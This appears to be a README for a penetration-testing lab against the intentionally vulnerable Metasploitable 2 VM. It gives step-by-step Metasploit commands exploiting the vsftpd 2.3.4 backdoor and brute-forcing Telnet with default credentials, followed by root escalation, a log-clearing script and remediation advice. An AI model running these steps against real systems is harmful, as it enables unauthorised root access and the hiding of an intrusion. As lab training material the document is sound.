# 🎯 Metasploitable 2: Penetration Testing Lab

## 📌 Project Overview
โปรเจกต์นี้เป็นการจำลองการทดสอบเจาะระบบ (Penetration Testing) บนเครื่องเป้าหมาย **Metasploitable 2** ซึ่งเป็นระบบปฏิบัติการ Linux ที่ถูกออกแบบมาให้มีช่องโหว่ เพื่อใช้สำหรับการศึกษาและฝึกฝนด้าน Cybersecurity อย่างปลอดภัย

**Tools Used:**
* 💻 **Attacker Machine:** Kali Linux
* 🛡️ **Target Machine:** Metasploitable 2
* 🔫 **Framework & Tools:** Nmap, Metasploit Framework (MSF)

---

## 🗺️ Attack Flowchart
![Attack Flowchart](FlowChart.png)

---

## 🚀 Execution Steps (ขั้นตอนการโจมตี)

### Target 1: Port 21 (FTP - vsftpd 2.3.4 Backdoor)
ช่องโหว่นี้เกิดจากซอฟต์แวร์ vsftpd เวอร์ชัน 2.3.4 มีการฝัง Backdoor เอาไว้ ทำให้แฮกเกอร์สามารถเข้าถึงสิทธิ์ root ได้ทันที
```bash
# 1. Scanning
nmap -p 21 -sV [Target_IP]

# 2. Exploitation (via Metasploit)
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
info
show options
set RHOSTS [Target_IP]
exploit

# 3. Post-Exploitation (Verify Root Access)
whoami
pwd
ls -la
```
Target 2: Port 23 (Telnet - Brute Force Attack)
ช่องโหว่นี้เกิดจากการตั้งรหัสผ่านที่คาดเดาง่าย (Weak Password) ประกอบกับ Telnet ส่งข้อมูลแบบ Plain-text
```bash
# 1. Scanning
nmap -p 23 -sV [Target_IP]

# 2. Brute Force Attack (via Metasploit)
msfconsole
use auxiliary/scanner/telnet/telnet_login

# สามารถเลือกใช้ Dictionary Attack หรือระบุ Username/Password ตรงๆ
set USERNAME msfadmin
set PASSWORD msfadmin
# หรือใช้ไฟล์: set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt

set RHOSTS [Target_IP]
set THREADS 10
set VERBOSE false
run

# 3. Session Connection
sessions
sessions -i [Session_ID]

# 4. Privilege Escalation (ไต่ระดับสิทธิ์เป็น Root)
whoami
sudo su
# (Enter password: msfadmin)
whoami
cd /root
ls -la
```
Post-Mission & Reset
ขั้นตอนการลบร่องรอยและรีเซ็ตระบบกลับสู่สภาพเดิม
```bash
# On Target Machine
cd /root
cat reset_logs.sh
./reset_logs.sh
reboot
exit

# On Attacker Machine
clear
```
Remediation (ข้อเสนอแนะในการป้องกัน)
Port 21 (FTP): อัปเดตซอฟต์แวร์ vsftpd ให้เป็นเวอร์ชันล่าสุดที่ไม่มี Backdoor หรือเปลี่ยนไปใช้ SFTP ที่มีความปลอดภัยกว่า

Port 23 (Telnet): ปิดการใช้งาน Telnet เนื่องจากไม่มีการเข้ารหัสข้อมูล และเปลี่ยนไปใช้ SSH (Port 22) แทน รวมถึงตั้งนโยบายรหัสผ่านให้ซับซ้อนขึ้น (Strong Password Policy)

